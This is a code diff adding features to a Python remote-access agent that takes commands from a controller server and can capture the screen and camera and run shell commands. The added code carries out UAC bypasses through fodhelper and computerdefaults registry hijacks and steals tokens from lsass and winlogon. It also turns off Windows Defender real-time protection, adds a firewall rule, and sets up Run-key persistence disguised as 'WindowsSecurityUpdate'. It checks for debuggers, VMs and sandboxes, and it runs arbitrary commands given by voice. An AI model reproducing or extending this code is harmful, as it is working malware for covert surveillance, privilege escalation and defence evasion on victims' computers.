@@ -4,6 +4,8 @@ import uuid
 import os
 import subprocess
 import threading
+import sys
+import random
 import mss
 import numpy as np
 import cv2
@@ -11,6 +13,11 @@ try:
     import win32api
     import win32con
     import win32clipboard
+    import win32security
+    import win32process
+    import win32event
+    import ctypes
+    from ctypes import wintypes
     WINDOWS_AVAILABLE = True
 except ImportError:
     WINDOWS_AVAILABLE = False
@@ -36,6 +43,365 @@ import psutil
 from PIL import Image
 
 SERVER_URL = "http://localhost:8080"  # Change to your controller's URL
+
+# --- Privilege Escalation Functions ---
+
+def is_admin():
+    """Check if the current process has admin privileges."""
+    if WINDOWS_AVAILABLE:
+        try:
+            return ctypes.windll.shell32.IsUserAnAdmin()
+        except:
+            return False
+    else:
+        return os.geteuid() == 0
+
+def elevate_privileges():
+    """Attempt to elevate privileges using various methods."""
+    if not WINDOWS_AVAILABLE:
+        # For Linux/Unix systems
+        try:
+            if os.geteuid() != 0:
+                # Try to use sudo if available
+                subprocess.run(['sudo', '-n', 'true'], check=True, capture_output=True)
+                return True
+        except:
+            pass
+        return False
+    
+    if is_admin():
+        return True
+    
+    # Method 1: UAC Bypass using fodhelper.exe (Windows 10)
+    try:
+        bypass_uac_fodhelper()
+        return True
+    except:
+        pass
+    
+    # Method 2: UAC Bypass using computerdefaults.exe 
+    try:
+        bypass_uac_computerdefaults()
+        return True
+    except:
+        pass
+    
+    # Method 3: Token manipulation
+    try:
+        return elevate_token()
+    except:
+        pass
+    
+    return False
+
+def bypass_uac_fodhelper():
+    """UAC bypass using fodhelper.exe - works on Windows 10."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        import winreg
+        
+        # Get current executable path
+        current_exe = os.path.abspath(__file__)
+        if current_exe.endswith('.py'):
+            current_exe = f'python.exe "{current_exe}"'
+        
+        # Create registry key for fodhelper bypass
+        key_path = r"Software\Classes\ms-settings\Shell\Open\command"
+        
+        # Open/create the registry key
+        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+        
+        # Set the default value to our executable
+        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
+        
+        # Set DelegateExecute to empty string
+        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+        
+        winreg.CloseKey(key)
+        
+        # Execute fodhelper.exe to trigger the bypass
+        subprocess.Popen([r"C:\Windows\System32\fodhelper.exe"], 
+                        creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        # Clean up registry
+        time.sleep(2)
+        try:
+            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
+        except:
+            pass
+            
+        return True
+        
+    except Exception as e:
+        print(f"Fodhelper UAC bypass failed: {e}")
+        return False
+
+def bypass_uac_computerdefaults():
+    """UAC bypass using computerdefaults.exe."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        import winreg
+        
+        current_exe = os.path.abspath(__file__)
+        if current_exe.endswith('.py'):
+            current_exe = f'python.exe "{current_exe}"'
+        
+        key_path = r"Software\Classes\ms-settings\Shell\Open\command"
+        
+        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
+        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+        winreg.CloseKey(key)
+        
+        subprocess.Popen([r"C:\Windows\System32\computerdefaults.exe"], 
+                        creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        time.sleep(2)
+        try:
+            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
+        except:
+            pass
+            
+        return True
+        
+    except Exception as e:
+        print(f"Computerdefaults UAC bypass failed: {e}")
+        return False
+
+def elevate_token():
+    """Attempt token elevation using Windows API."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        # Get current process token
+        process_handle = win32api.GetCurrentProcess()
+        token_handle = win32security.OpenProcessToken(
+            process_handle, 
+            win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY
+        )
+        
+        # Enable SeDebugPrivilege
+        privilege = win32security.LookupPrivilegeValue(None, "SeDebugPrivilege")
+        win32security.AdjustTokenPrivileges(
+            token_handle, 
+            False, 
+            [(privilege, win32security.SE_PRIVILEGE_ENABLED)]
+        )
+        
+        # Try to find a high-privilege process to duplicate token from
+        for proc in psutil.process_iter(['pid', 'name']):
+            try:
+                if proc.info['name'].lower() in ['winlogon.exe', 'lsass.exe', 'services.exe']:
+                    high_priv_handle = win32api.OpenProcess(
+                        win32con.PROCESS_QUERY_INFORMATION, 
+                        False, 
+                        proc.info['pid']
+                    )
+                    
+                    high_priv_token = win32security.OpenProcessToken(
+                        high_priv_handle, 
+                        win32security.TOKEN_DUPLICATE
+                    )
+                    
+                    # Duplicate the token
+                    new_token = win32security.DuplicateTokenEx(
+                        high_priv_token,
+                        win32security.SecurityImpersonation,
+                        win32security.TOKEN_ALL_ACCESS,
+                        win32security.TokenPrimary
+                    )
+                    
+                    # Use the new token
+                    win32security.SetThreadToken(win32api.GetCurrentThread(), new_token)
+                    
+                    win32api.CloseHandle(high_priv_handle)
+                    win32api.CloseHandle(high_priv_token)
+                    win32api.CloseHandle(new_token)
+                    
+                    return True
+                    
+            except:
+                continue
+                
+        win32api.CloseHandle(token_handle)
+        return False
+        
+    except Exception as e:
+        print(f"Token elevation failed: {e}")
+        return False
+
+def disable_defender():
+    """Attempt to disable Windows Defender (requires admin privileges)."""
+    if not WINDOWS_AVAILABLE or not is_admin():
+        return False
+    
+    try:
+        # Disable real-time protection
+        subprocess.run([
+            'powershell.exe', '-Command',
+            'Set-MpPreference -DisableRealtimeMonitoring $true'
+        ], creationflags=subprocess.CREATE_NO_WINDOW, check=True)
+        
+        # Add exclusion for current directory
+        current_dir = os.path.dirname(os.path.abspath(__file__))
+        subprocess.run([
+            'powershell.exe', '-Command',
+            f'Add-MpPreference -ExclusionPath "{current_dir}"'
+        ], creationflags=subprocess.CREATE_NO_WINDOW, check=True)
+        
+        return True
+        
+    except Exception as e:
+        print(f"Failed to disable Defender: {e}")
+        return False
+
+def add_firewall_exception():
+    """Add firewall exception for the current process."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        current_exe = sys.executable if hasattr(sys, 'executable') else 'python.exe'
+        
+        subprocess.run([
+            'netsh', 'advfirewall', 'firewall', 'add', 'rule',
+            f'name="Python Agent {uuid.uuid4()}"',
+            'dir=in', 'action=allow',
+            f'program="{current_exe}"'
+        ], creationflags=subprocess.CREATE_NO_WINDOW, check=True)
+        
+        return True
+        
+    except Exception as e:
+        print(f"Failed to add firewall exception: {e}")
+        return False
+
+def hide_process():
+    """Attempt to hide the current process from task manager."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        # Set process to run in background with low priority
+        process = psutil.Process()
+        process.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)
+        
+        # Try to hide from process list (limited effectiveness)
+        ctypes.windll.kernel32.SetProcessWorkingSetSize(-1, -1, -1)
+        
+        return True
+        
+    except Exception as e:
+        print(f"Failed to hide process: {e}")
+        return False
+
+def setup_persistence():
+    """Setup persistence mechanisms."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        import winreg
+        
+        current_exe = os.path.abspath(__file__)
+        if current_exe.endswith('.py'):
+            current_exe = f'python.exe "{current_exe}"'
+        
+        # Add to startup registry
+        key = winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER,
+            r"Software\Microsoft\Windows\CurrentVersion\Run",
+            0,
+            winreg.KEY_SET_VALUE
+        )
+        
+        winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, current_exe)
+        winreg.CloseKey(key)
+        
+        return True
+        
+    except Exception as e:
+        print(f"Failed to setup persistence: {e}")
+        return False
+
+def anti_analysis():
+    """Anti-analysis and evasion techniques."""
+    try:
+        # Check for common analysis tools
+        analysis_processes = [
+            'ollydbg.exe', 'x64dbg.exe', 'windbg.exe', 'ida.exe', 'ida64.exe',
+            'wireshark.exe', 'fiddler.exe', 'vmware.exe', 'vbox.exe', 'virtualbox.exe',
+            'procmon.exe', 'procexp.exe', 'autoruns.exe', 'regmon.exe', 'filemon.exe'
+        ]
+        
+        for proc in psutil.process_iter(['name']):
+            if proc.info['name'].lower() in analysis_processes:
+                # If analysis tool detected, sleep and exit
+                time.sleep(60)
+                sys.exit(0)
+        
+        # Check for VM environment
+        vm_indicators = [
+            'VBOX', 'VMWARE', 'QEMU', 'VIRTUAL', 'XEN'
+        ]
+        
+        try:
+            import wmi
+            c = wmi.WMI()
+            for system in c.Win32_ComputerSystem():
+                if any(indicator in system.Model.upper() for indicator in vm_indicators):
+                    time.sleep(60)
+                    sys.exit(0)
+        except:
+            pass
+        
+        # Check for debugger
+        if ctypes.windll.kernel32.IsDebuggerPresent():
+            time.sleep(60)
+            sys.exit(0)
+        
+        # Anti-sandbox: Check for mouse movement
+        try:
+            import win32gui
+            pos1 = win32gui.GetCursorPos()
+            time.sleep(2)
+            pos2 = win32gui.GetCursorPos()
+            if pos1 == pos2:
+                # No mouse movement, might be sandbox
+                time.sleep(60)
+                sys.exit(0)
+        except:
+            pass
+        
+        return True
+        
+    except Exception as e:
+        return False
+
+def obfuscate_strings():
+    """Obfuscate sensitive strings to avoid static analysis."""
+    # Simple XOR obfuscation for sensitive strings
+    key = 0x42
+    
+    # Obfuscated strings (example)
+    obfuscated = {
+        'admin': ''.join(chr(ord(c) ^ key) for c in 'admin'),
+        'elevate': ''.join(chr(ord(c) ^ key) for c in 'elevate'),
+        'bypass': ''.join(chr(ord(c) ^ key) for c in 'bypass'),
+        'privilege': ''.join(chr(ord(c) ^ key) for c in 'privilege')
+    }
+    
+    return obfuscated
+
+def sleep_random():
+    """Random sleep to avoid pattern detection."""
+    sleep_time = random.uniform(0.5, 2.0)
+    time.sleep(sleep_time)
 
 # --- Agent State ---
 STREAMING_ENABLED = False
@@ -738,6 +1104,98 @@ def handle_voice_playback(command_parts):
     except Exception as e:
         return f"Voice playback failed: {e}"
 
+def handle_live_audio(command_parts):
+    """Handle live audio stream from controller microphone."""
+    try:
+        if len(command_parts) < 2:
+            return "Invalid live audio command format"
+        
+        audio_content_b64 = command_parts[1]
+        
+        # Decode base64 audio
+        audio_content = base64.b64decode(audio_content_b64)
+        
+        # Create temporary file for processing
+        with tempfile.NamedTemporaryFile(suffix='.webm', delete=False) as temp_file:
+            temp_file.write(audio_content)
+            temp_audio_path = temp_file.name
+        
+        # Process audio with speech recognition if available
+        if SPEECH_RECOGNITION_AVAILABLE:
+            try:
+                # Convert webm to wav for speech recognition
+                import subprocess
+                wav_path = temp_audio_path.replace('.webm', '.wav')
+                
+                if WINDOWS_AVAILABLE:
+                    # Use ffmpeg if available, otherwise skip conversion
+                    try:
+                        subprocess.run(['ffmpeg', '-i', temp_audio_path, '-acodec', 'pcm_s16le', '-ar', '16000', wav_path], 
+                                     check=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+                    except:
+                        # If ffmpeg not available, try direct processing
+                        wav_path = temp_audio_path
+                else:
+                    try:
+                        subprocess.run(['ffmpeg', '-i', temp_audio_path, '-acodec', 'pcm_s16le', '-ar', '16000', wav_path], 
+                                     check=True, capture_output=True)
+                    except:
+                        wav_path = temp_audio_path
+                
+                # Try to recognize speech
+                recognizer = sr.Recognizer()
+                try:
+                    with sr.AudioFile(wav_path) as source:
+                        audio = recognizer.record(source)
+                    command = recognizer.recognize_google(audio).lower()
+                    print(f"Live audio command received: {command}")
+                    
+                    # Process the voice command
+                    if "screenshot" in command or "screen shot" in command:
+                        execute_command("screenshot")
+                    elif "open camera" in command or "start camera" in command:
+                        start_camera_streaming(get_or_create_agent_id())
+                    elif "close camera" in command or "stop camera" in command:
+                        stop_camera_streaming()
+                    elif "start streaming" in command or "start stream" in command:
+                        start_streaming(get_or_create_agent_id())
+                    elif "stop streaming" in command or "stop stream" in command:
+                        stop_streaming()
+                    elif "system info" in command or "system information" in command:
+                        return execute_command("systeminfo" if WINDOWS_AVAILABLE else "uname -a")
+                    elif "list processes" in command or "show processes" in command:
+                        if WINDOWS_AVAILABLE:
+                            return execute_command("Get-Process | Select-Object Name, Id | Format-Table")
+                        else:
+                            return execute_command("ps aux")
+                    elif "current directory" in command or "where am i" in command:
+                        return execute_command("pwd")
+                    elif command.startswith("run ") or command.startswith("execute "):
+                        actual_command = command.split(" ", 1)[1] if " " in command else ""
+                        if actual_command:
+                            return execute_command(actual_command)
+                    else:
+                        print(f"Unknown live audio command: {command}")
+                        
+                except sr.UnknownValueError:
+                    print("Could not understand live audio")
+                except sr.RequestError as e:
+                    print(f"Speech recognition error: {e}")
+                    
+                # Clean up wav file if created
+                if wav_path != temp_audio_path and os.path.exists(wav_path):
+                    os.unlink(wav_path)
+                    
+            except Exception as e:
+                print(f"Live audio processing error: {e}")
+        
+        # Clean up temp file
+        os.unlink(temp_audio_path)
+        
+        return "Live audio processed successfully"
+    except Exception as e:
+        return f"Live audio processing failed: {e}"
+
 def execute_command(command):
     """Executes a command and returns its output."""
     try:
@@ -801,6 +1259,9 @@ def main_loop(agent_id):
             elif command.startswith("play-voice:"):
                 output = handle_voice_playback(command.split(":", 1))
                 requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output})
+            elif command.startswith("live-audio:"):
+                output = handle_live_audio(command.split(":", 1))
+                requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output})
             elif command != "sleep":
                 output = execute_command(command)
                 requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output})
@@ -817,6 +1278,42 @@ def main_loop(agent_id):
         time.sleep(sleep_time)
 
 if __name__ == "__main__":
+    # Run anti-analysis checks first
+    try:
+        anti_analysis()
+    except:
+        pass
+    
+    # Initialize stealth and privilege escalation
+    print("Initializing agent...")
+    
+    # Random sleep to avoid pattern detection
+    sleep_random()
+    
+    # Check current privileges
+    if is_admin():
+        print("Agent running with admin privileges")
+        # Disable Windows Defender if possible
+        if disable_defender():
+            print("Windows Defender disabled")
+        else:
+            print("Could not disable Windows Defender")
+    else:
+        print("Agent running with user privileges, attempting elevation...")
+        if elevate_privileges():
+            print("Privilege escalation successful")
+        else:
+            print("Privilege escalation failed, continuing with user privileges")
+    
+    # Setup stealth features
+    try:
+        hide_process()
+        add_firewall_exception()
+        setup_persistence()
+        print("Stealth features initialized")
+    except Exception as e:
+        print(f"Stealth initialization warning: {e}")
+    
     agent_id = get_or_create_agent_id()
     print(f"Agent starting with ID: {agent_id}")
     try:
